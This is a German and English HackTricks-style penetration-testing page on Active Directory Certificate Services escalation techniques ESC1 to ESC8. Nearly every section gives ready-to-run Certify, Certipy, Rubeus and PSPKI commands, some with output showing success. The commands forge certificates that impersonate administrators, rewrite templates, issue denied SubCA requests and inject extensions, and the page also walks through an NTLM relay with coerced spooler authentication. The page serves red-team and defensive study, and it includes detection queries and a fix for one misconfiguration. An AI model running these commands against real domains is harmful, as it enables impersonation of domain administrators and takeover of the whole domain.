# AD CS Domänen-Eskalation

{{#include ../../../banners/hacktricks-training.md}}


**Dies ist eine Zusammenfassung der Eskalationstechnik-Abschnitte der Beiträge:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Fehlkonfigurierte Zertifikatvorlagen - ESC1

### Erklärung

### Fehlkonfigurierte Zertifikatvorlagen - ESC1 erklärt

- **Enrolment-Rechte werden von der Enterprise CA an niedrig privilegierte Benutzer vergeben.**
- **Manager-Genehmigung ist nicht erforderlich.**
- **Keine Signaturen von autorisiertem Personal sind nötig.**
- **Security Descriptors auf Zertifikatvorlagen sind zu permissiv und erlauben es niedrig privilegierten Benutzern, Enrolment-Rechte zu erhalten.**
- **Zertifikatvorlagen sind so konfiguriert, dass sie EKUs definieren, die die Authentifizierung ermöglichen:**
- Extended Key Usage (EKU) Identifier wie Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) oder kein EKU (SubCA) sind enthalten.
- **Die Vorlage erlaubt es Antragstellern, ein subjectAltName in die Certificate Signing Request (CSR) aufzunehmen:**
- Active Directory (AD) priorisiert das subjectAltName (SAN) in einem Zertifikat für die Identitätsüberprüfung, falls vorhanden. Das bedeutet, dass durch die Angabe des SAN in einer CSR ein Zertifikat angefordert werden kann, das jede beliebige Identität (z. B. einen Domain-Administrator) impersonifiziert. Ob ein SAN vom Antragsteller angegeben werden kann, wird im AD-Objekt der Zertifikatvorlage durch die Eigenschaft `mspki-certificate-name-flag` angezeigt. Diese Eigenschaft ist eine Bitmaske, und das Vorhandensein des Flags `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` erlaubt die Angabe des SAN durch den Antragsteller.

> [!CAUTION]
> Die beschriebene Konfiguration erlaubt es niedrig privilegierten Benutzern, Zertifikate mit einem beliebigen SAN zu verlangen, wodurch eine Authentifizierung als beliebiges Domain-Principal über Kerberos oder SChannel möglich ist.

Diese Funktion ist manchmal aktiviert, um die on-the-fly-Erzeugung von HTTPS- oder Host-Zertifikaten durch Produkte oder Deployment-Services zu unterstützen oder aufgrund fehlenden Verständnisses.

Es wird darauf hingewiesen, dass das Erstellen eines Zertifikats mit dieser Option eine Warnung auslöst, was nicht der Fall ist, wenn eine vorhandene Zertifikatvorlage (wie die `WebServer`-Vorlage, die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` aktiviert hat) dupliziert und anschließend geändert wird, um eine Authentifizierungs-OID einzuschließen.

### Missbrauch

Um **verwundbare Zertifikatvorlagen zu finden** können Sie ausführen:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Um **diese Schwachstelle auszunutzen, um sich als Administrator auszugeben**, könnte man ausführen:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Anschließend können Sie das erzeugte **Zertifikat in das `.pfx`-Format** konvertieren und es erneut verwenden, um sich mit **Rubeus oder certipy** zu authentifizieren:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-Binaries "Certreq.exe" & "Certutil.exe" können verwendet werden, um eine PFX-Datei zu erzeugen: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die Auflistung von Zertifikatvorlagen im Konfigurationsschema des AD-Forest, speziell jener, die keine Genehmigung oder Signaturen erfordern, die eine Client Authentication- oder Smart Card Logon-EKU besitzen und bei denen das Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` gesetzt ist, kann durch Ausführen der folgenden LDAP-Abfrage erfolgen:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Fehlkonfigurierte Zertifikatvorlagen - ESC2

### Erklärung

Das zweite Missbrauchsszenario ist eine Variante des ersten:

1. Die Enterprise CA gewährt Benutzern mit geringen Rechten Registrierungsrechte.
2. Die Genehmigung durch einen Vorgesetzten ist deaktiviert.
3. Die Notwendigkeit autorisierter Signaturen ist nicht erforderlich.
4. Ein zu permissiver Security Descriptor auf der Zertifikatvorlage gewährt Benutzern mit geringen Rechten das Recht zur Zertifikatsregistrierung.
5. **Die Zertifikatvorlage ist so definiert, dass sie das Any Purpose EKU oder kein EKU enthält.**

Das **Any Purpose EKU** erlaubt einem Angreifer, ein Zertifikat für **beliebigen Zweck** zu beziehen, einschließlich Client-Authentifizierung, Server-Authentifizierung, Code-Signing usw. Dieselbe **Technik, die für ESC3 verwendet wird**, kann genutzt werden, um dieses Szenario auszunutzen.

Zertifikate mit **no EKUs**, die als subordinate CA-Zertifikate fungieren, können für **beliebigen Zweck** ausgenutzt werden und **auch zum Signieren neuer Zertifikate verwendet werden**. Ein Angreifer könnte daher mittels eines subordinate CA-Zertifikats beliebige EKUs oder Felder in den neuen Zertifikaten angeben.

Allerdings funktionieren neu erstellte Zertifikate für die **domain authentication** nicht, wenn die subordinate CA nicht vom Objekt `NTAuthCertificates` vertraut wird, was die Standardeinstellung ist. Nichtsdestotrotz kann ein Angreifer weiterhin **neue Zertifikate mit beliebigen EKUs** und beliebige Zertifikatwerte erstellen. Diese könnten potenziell für viele Zwecke **missbraucht** werden (z. B. Code-Signing, Server-Authentifizierung usw.) und erhebliche Auswirkungen auf andere Anwendungen im Netzwerk haben, wie SAML, AD FS oder IPSec.

Um Vorlagen zu ermitteln, die diesem Szenario im Konfigurationsschema des AD Forests entsprechen, kann die folgende LDAP-Abfrage ausgeführt werden:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Fehlkonfigurierte Enrolment Agent Templates - ESC3

### Erklärung

Dieses Szenario ähnelt dem ersten und zweiten, nutzt jedoch **einen anderen EKU** (Certificate Request Agent) und **2 verschiedene Vorlagen** (daher gibt es 2 Anforderungssätze).

Der **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), in der Microsoft-Dokumentation als **Enrollment Agent** bezeichnet, erlaubt es einem Prinzipal, ein **Zertifikat** im **Namen eines anderen Benutzers** zu **beantragen**.

Der **„enrollment agent“** meldet sich für eine solche **Vorlage** an und verwendet das resultierende **Zertifikat, um eine CSR im Namen des anderen Benutzers mitzuunterzeichnen**. Er **sendet** dann die **mitunterschriebene CSR** an die CA, meldet sich in einer **Vorlage** an, die das **„enroll on behalf of“** erlaubt, und die CA antwortet mit einem **Zertifikat, das dem „anderen“ Benutzer gehört**.

**Anforderungen 1:**

- Die Enterprise CA gewährt gering privilegierten Benutzern Registrierungsrechte.
- Die Anforderung einer Genehmigung durch einen Manager entfällt.
- Keine Anforderung autorisierter Signaturen.
- Der Sicherheitsdeskriptor der Zertifikatvorlage ist übermäßig permissiv und gewährt Registrierungsrechte an gering privilegierte Benutzer.
- Die Zertifikatvorlage enthält den Certificate Request Agent EKU, wodurch das Anfordern anderer Zertifikatvorlagen im Auftrag anderer Prinzipale ermöglicht wird.

**Anforderungen 2:**

- Die Enterprise CA gewährt gering privilegierten Benutzern Registrierungsrechte.
- Die Genehmigung durch einen Manager wird umgangen.
- Die Schema-Version der Vorlage ist entweder 1 oder größer als 2, und sie spezifiziert eine Application Policy Issuance Requirement, die den Certificate Request Agent EKU erfordert.
- Ein in der Zertifikatvorlage definiertes EKU erlaubt die Domänen-Authentifizierung.
- Beschränkungen für Enrollment Agents werden von der CA nicht angewendet.

### Abuse

Sie können [**Certify**](https://github.com/GhostPack/Certify) oder [**Certipy**](https://github.com/ly4k/Certipy) verwenden, um dieses Szenario auszunutzen:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **Benutzer**, die berechtigt sind, ein **Enrollment-Agent-Zertifikat** zu **erhalten**, die Vorlagen, in die sich Enrollment-**Agents** eintragen dürfen, und die **Konten**, in deren Namen der Enrollment-Agent handeln kann, können von Enterprise-CAs eingeschränkt werden. Dies erfolgt durch Öffnen des `certsrc.msc` **snap-in**, **Rechtsklick auf die CA**, **Eigenschaften auswählen** und dann **Navigieren** zur Registerkarte “Enrollment Agents”.

Es sei jedoch darauf hingewiesen, dass die **Standard**-Einstellung für CAs “**Do not restrict enrollment agents**.” ist. Wenn die Beschränkung für Enrollment Agents von Administratoren aktiviert und auf “Restrict enrollment agents” gesetzt wird, bleibt die Standardkonfiguration extrem permissiv. Sie erlaubt **Everyone** den Zugriff, sich in allen Vorlagen als beliebiger Benutzer einzutragen.

## Verwundbare Zugriffssteuerung für Zertifikatvorlagen - ESC4

### **Erklärung**

Der **Sicherheitsdeskriptor** von **Zertifikatvorlagen** legt die **Berechtigungen** fest, die spezifische **AD-Prinzipale** in Bezug auf die Vorlage besitzen.

Sollte ein **Angreifer** über die erforderlichen **Berechtigungen** verfügen, eine **Vorlage** zu **ändern** und eine der in den vorherigen Abschnitten beschriebenen ausnutzbaren Fehlkonfigurationen einzuführen, könnte dies eine Privilegieneskalation ermöglichen.

Wesentliche Berechtigungen, die auf Zertifikatvorlagen zutreffen, umfassen:

- **Owner:** Gewährt implizite Kontrolle über das Objekt und erlaubt das Ändern beliebiger Attribute.
- **FullControl:** Ermöglicht vollständige Kontrolle über das Objekt, einschließlich der Fähigkeit, beliebige Attribute zu verändern.
- **WriteOwner:** Erlaubt das Ändern des Eigentümers des Objekts zu einem vom Angreifer kontrollierten Prinzipal.
- **WriteDacl:** Ermöglicht die Anpassung der Zugriffskontrollen, was einem Angreifer möglicherweise FullControl gewähren kann.
- **WriteProperty:** Autorisiert das Bearbeiten beliebiger Objekteigenschaften.

### Missbrauch

Um Prinzipale mit Bearbeitungsrechten an Vorlagen und anderen PKI-Objekten zu identifizieren, mit Certify enumerieren:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Ein Beispiel für ein privesc wie das vorherige:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 ist, wenn ein Benutzer Schreibrechte für eine Zertifikatvorlage hat. Dies kann z. B. missbraucht werden, um die Konfiguration der Zertifikatvorlage zu überschreiben und die Vorlage für ESC1 angreifbar zu machen.

Wie wir im obigen Pfad sehen, hat nur `JOHNPC` diese Privilegien, aber unser Benutzer `JOHN` hat die neue `AddKeyCredentialLink`-Kante zu `JOHNPC`. Da diese Technik mit Zertifikaten zusammenhängt, habe ich diesen Angriff ebenfalls implementiert, der als [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) bekannt ist. Hier ein kleiner Einblick in Certipy’s `shadow auto`-Befehl, um den NT-Hash des Opfers abzurufen.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kann die Konfiguration einer Zertifikatvorlage mit einem einzigen Befehl überschreiben. Standardmäßig wird Certipy die Konfiguration so **überschreiben**, dass sie **vulnerable to ESC1** ist. Wir können außerdem den **`-save-old` Parameter zum Speichern der alten Konfiguration** angeben, was nützlich ist, um die Konfiguration nach unserem Angriff **wiederherzustellen**.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Verwundbare PKI-Objekt-Zugriffssteuerung - ESC5

### Erläuterung

Das umfangreiche Netz aus miteinander verbundenen, auf ACL basierenden Beziehungen, das mehrere Objekte über Zertifikatvorlagen und die Zertifizierungsstelle hinaus umfasst, kann die Sicherheit des gesamten AD CS-Systems beeinträchtigen. Zu diesen sicherheitsrelevanten Objekten gehören:

- Das AD-Computerobjekt des CA-Servers, das durch Mechanismen wie S4U2Self oder S4U2Proxy kompromittiert werden kann.
- Der RPC/DCOM-Server des CA-Servers.
- Jedes nachgeordnete AD-Objekt oder Container innerhalb des speziellen Containerpfads `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Dieser Pfad umfasst u. a. Container und Objekte wie den Certificate Templates container, den Certification Authorities container, das NTAuthCertificates-Objekt und den Enrollment Services Container.

Die Sicherheit des PKI-Systems kann beeinträchtigt werden, wenn ein niedrig privilegierter Angreifer Kontrolle über eines dieser kritischen Komponenten erlangt.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Erläuterung

Der in der [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) behandelte Beitrag geht auch auf die Auswirkungen des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`** ein, wie sie von Microsoft beschrieben werden. Wenn diese Konfiguration auf einer Certification Authority (CA) aktiviert ist, erlaubt sie die Einfügung von benutzerdefinierten Werten in das subject alternative name für jede Anfrage, einschließlich solcher, die aus Active Directory® erstellt wurden. Folglich ermöglicht diese Einstellung einem Angreifer die Registrierung über jede für die Domänenauthentifizierung eingerichtete Vorlage — insbesondere solche, die weniger privilegierten Benutzern zur Registrierung offenstehen, wie die Standard-User-Vorlage. Dadurch kann ein Zertifikat erlangt werden, das dem Angreifer die Authentifizierung als Domänenadministrator oder jede andere aktive Entität innerhalb der Domäne ermöglicht.

**Hinweis**: Der Ansatz, alternative Namen in eine Certificate Signing Request (CSR) einzufügen — über das Argument `-attrib "SAN:"` in `certreq.exe` (als “Name Value Pairs” bezeichnet) — unterscheidet sich von der Ausnutzungsstrategie von SANs in ESC1. Der Unterschied besteht hier darin, wie Kontoinformationen eingebettet werden: in einem Zertifikatattribut statt in einer Erweiterung.

### Missbrauch

Um zu überprüfen, ob die Einstellung aktiviert ist, können Organisationen den folgenden Befehl mit `certutil.exe` verwenden:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Diese Operation verwendet im Wesentlichen **remote registry access**, daher könnte ein alternativer Ansatz sein:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools wie [**Certify**](https://github.com/GhostPack/Certify) und [**Certipy**](https://github.com/ly4k/Certipy) können diese Fehlkonfiguration erkennen und ausnutzen:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Um diese Einstellungen zu ändern, vorausgesetzt man verfügt über **Domain-Administratorrechte** oder gleichwertige Berechtigungen, kann der folgende Befehl von jedem Arbeitsplatz aus ausgeführt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Um diese Konfiguration in Ihrer Umgebung zu deaktivieren, kann das flag mit folgendem Befehl entfernt werden:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Nach den Sicherheitsupdates vom Mai 2022 werden neu ausgestellte **certificates** eine **security extension** enthalten, die die **`objectSid`-Eigenschaft des Anfordernden** einbindet. Für ESC1 wird diese SID aus dem angegebenen SAN abgeleitet. Bei **ESC6** entspricht die SID jedoch der **`objectSid` des Anfordernden**, nicht dem SAN.\
> Um ESC6 auszunutzen, muss das System für ESC10 (Weak Certificate Mappings) anfällig sein, welches das **SAN gegenüber der neuen security extension** bevorzugt.

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

Die Zugriffskontrolle für eine Zertifizierungsstelle wird durch eine Reihe von Berechtigungen verwaltet, die CA-Aktionen steuern. Diese Berechtigungen können angezeigt werden, indem man `certsrv.msc` öffnet, mit der rechten Maustaste auf eine CA klickt, Properties wählt und dann zur Registerkarte Security navigiert. Zusätzlich können Berechtigungen mit dem PSPKI-Modul aufgelistet werden, z. B. mit Befehlen wie:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dies bietet Einblicke in die primären Rechte, nämlich **`ManageCA`** und **`ManageCertificates`**, die jeweils den Rollen „CA-Administrator“ und „Zertifikatsmanager“ entsprechen.

#### Abuse

Das Vorhandensein von **`ManageCA`**-Rechten auf einer Certificate Authority ermöglicht es dem Principal, Einstellungen remote mit PSPKI zu manipulieren. Dazu gehört das Umschalten des Flags **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, um die Angabe von SAN in beliebigen Templates zu erlauben — ein kritischer Aspekt bei Domäneneskalation.

Die Vereinfachung dieses Prozesses ist durch das PSPKI-cmdlet **Enable-PolicyModuleFlag** möglich, wodurch Änderungen ohne direkte GUI-Interaktion vorgenommen werden können.

Der Besitz von **`ManageCertificates`**-Rechten erleichtert die Genehmigung ausstehender Anfragen und umgeht damit effektiv die Schutzmaßnahme "CA certificate manager approval".

Eine Kombination der Module **Certify** und **PSPKI** kann verwendet werden, um ein Zertifikat anzufordern, zu genehmigen und herunterzuladen:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Erklärung

> [!WARNING]
> In der **previous attack** **`Manage CA`** permissions wurden verwendet, um die **EDITF_ATTRIBUTESUBJECTALTNAME2** Flagge zu **aktivieren**, um die **ESC6 attack** durchzuführen, aber dies hat keine Wirkung, bis der CA-Dienst (`CertSvc`) neu gestartet wird. Wenn ein Benutzer das Zugriffsrecht `Manage CA` hat, darf er auch den **Dienst neu starten**. Das bedeutet jedoch nicht, dass der Benutzer den Dienst aus der Ferne neu starten kann. Außerdem **ESC6 funktioniert möglicherweise nicht sofort** in den meisten gepatchten Umgebungen aufgrund der Sicherheitsupdates vom Mai 2022.

Daher wird hier eine weitere attack vorgestellt.

Voraussetzungen:

- Nur **`ManageCA`** Berechtigung
- **`Manage Certificates`** Berechtigung (kann von **`ManageCA`** gewährt werden)
- Das Zertifikat-Template **`SubCA`** muss **aktiviert** sein (kann von **`ManageCA`** aktiviert werden)

Die Technik beruht auf der Tatsache, dass Benutzer mit dem Zugriffsrecht `Manage CA` _und_ `Manage Certificates` fehlgeschlagene Zertifikatsanforderungen **ausstellen** können. Das Zertifikat-Template **`SubCA`** ist **anfällig für ESC1**, aber **nur Administratoren** können sich für das Template einschreiben. Daher kann ein **Benutzer** die Einschreibung in die **`SubCA`** **beantragen** – diese wird **abgelehnt** – aber anschließend vom Manager **ausgestellt**.

#### Missbrauch

Du kannst dir das Zugriffsrecht **`Manage Certificates`** selbst geben, indem du deinen Benutzer als neuen officer hinzufügst.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`**-Vorlage kann mit dem Parameter `-enable-template` **auf der CA aktiviert** werden. Standardmäßig ist die **`SubCA`**-Vorlage aktiviert.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Wenn wir die Voraussetzungen für diesen Angriff erfüllt haben, können wir damit beginnen, **ein Zertifikat basierend auf der `SubCA`-Vorlage anzufordern**.

**Diese Anfrage wird abgelehnt**, aber wir speichern den private key und notieren die request ID.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Mit unseren **`Manage CA` und `Manage Certificates`**-Rechten können wir dann mit dem `ca`-Befehl und dem Parameter `-issue-request <request ID>` **die fehlgeschlagene Zertifikatsanforderung ausstellen**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Und schließlich können wir mit dem `req`-Befehl und dem Parameter `-retrieve <request ID>` das **ausgestellte Zertifikat abrufen**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

In addition to the classic ESC7 abuses (enabling EDITF attributes or approving pending requests), **Certify 2.0** revealed a brand-new primitive that only requires the *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) role on the Enterprise CA.

The `ICertAdmin::SetExtension` RPC method can be executed by any principal holding *Manage Certificates*.  While the method was traditionally used by legitimate CAs to update extensions on **pending** requests, an attacker can abuse it to **append a *non-default* certificate extension** (for example a custom *Certificate Issuance Policy* OID such as `1.1.1.1`) to a request that is waiting for approval.

Because the targeted template does **not define a default value for that extension**, the CA will NOT overwrite the attacker-controlled value when the request is eventually issued.  The resulting certificate therefore contains an attacker-chosen extension that may:

* Satisfy Application / Issuance Policy requirements of other vulnerable templates (leading to privilege escalation).
* Inject additional EKUs or policies that grant the certificate unexpected trust in third-party systems.

In short, *Manage Certificates* – previously considered the “less powerful” half of ESC7 – can now be leveraged for full privilege escalation or long-term persistence, without touching CA configuration or requiring the more restrictive *Manage CA* right.

#### Abusing the primitive with Certify 2.0

1. **Submit a certificate request that will remain *pending*.**  This can be forced with a template that requires manager approval:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Append a custom extension to the pending request** using the new `manage-ca` command:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Wenn die Vorlage die Erweiterung *Certificate Issuance Policies* nicht bereits definiert, wird der obige Wert nach der Ausstellung beibehalten.*

3. **Issue the request** (if your role also has *Manage Certificates* approval rights) or wait for an operator to approve it.  Once issued, download the certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. The resulting certificate now contains the malicious issuance-policy OID and can be used in subsequent attacks (e.g. ESC13, domain escalation, etc.).

> NOTE:  The same attack can be executed with Certipy ≥ 4.7 through the `ca` command and the `-set-extension` parameter.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> In environments where **AD CS is installed**, if a **web enrollment endpoint vulnerable** exists and at least one **certificate template is published** that permits **domain computer enrollment and client authentication** (such as the default **`Machine`** template), it becomes possible for **any computer with the spooler service active to be compromised by an attacker**!

Several **HTTP-based enrollment methods** are supported by AD CS, made available through additional server roles that administrators may install. These interfaces for HTTP-based certificate enrollment are susceptible to **NTLM relay attacks**. An attacker, from a **compromised machine, can impersonate any AD account that authenticates via inbound NTLM**. While impersonating the victim account, these web interfaces can be accessed by an attacker to **request a client authentication certificate using the `User` or `Machine` certificate templates**.

- The **web enrollment interface** (an older ASP application available at `http://<caserver>/certsrv/`), defaults to HTTP only, which does not offer protection against NTLM relay attacks. Additionally, it explicitly permits only NTLM authentication through its Authorization HTTP header, rendering more secure authentication methods like Kerberos inapplicable.
- The **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service, and **Network Device Enrollment Service** (NDES) by default support negotiate authentication via their Authorization HTTP header. Negotiate authentication **supports both** Kerberos and **NTLM**, allowing an attacker to **downgrade to NTLM** authentication during relay attacks. Although these web services enable HTTPS by default, HTTPS alone **does not safeguard against NTLM relay attacks**. Protection from NTLM relay attacks for HTTPS services is only possible when HTTPS is combined with channel binding. Regrettably, AD CS does not activate Extended Protection for Authentication on IIS, which is required for channel binding.

A common **issue** with NTLM relay attacks is the **short duration of NTLM sessions** and the inability of the attacker to interact with services that **require NTLM signing**.

Nevertheless, this limitation is overcome by exploiting an NTLM relay attack to acquire a certificate for the user, as the certificate's validity period dictates the session's duration, and the certificate can be employed with services that **mandate NTLM signing**. For instructions on utilizing a stolen certificate, refer to:


{{#ref}}
account-persistence.md
{{#endref}}

Another limitation of NTLM relay attacks is that **an attacker-controlled machine must be authenticated to by a victim account**. The attacker could either wait or attempt to **force** this authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

Der `cas`-Befehl von [**Certify**](https://github.com/GhostPack/Certify) listet **aktivierte HTTP AD CS-Endpunkte** auf:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die Eigenschaft `msPKI-Enrollment-Servers` wird von unternehmensweiten Zertifizierungsstellen (CAs) verwendet, um Certificate Enrollment Service (CES)-Endpunkte zu speichern. Diese Endpunkte können mit dem Tool **Certutil.exe** geparst und aufgelistet werden:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Missbrauch mit Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Die Anforderung eines Zertifikats wird von Certipy standardmäßig auf Basis der Vorlage `Machine` oder `User` gestellt, abhängig davon, ob der weitergeleitete Kontoname mit `$` endet. Die Angabe einer alternativen Vorlage kann durch Verwendung des Parameters `-template` erfolgen.

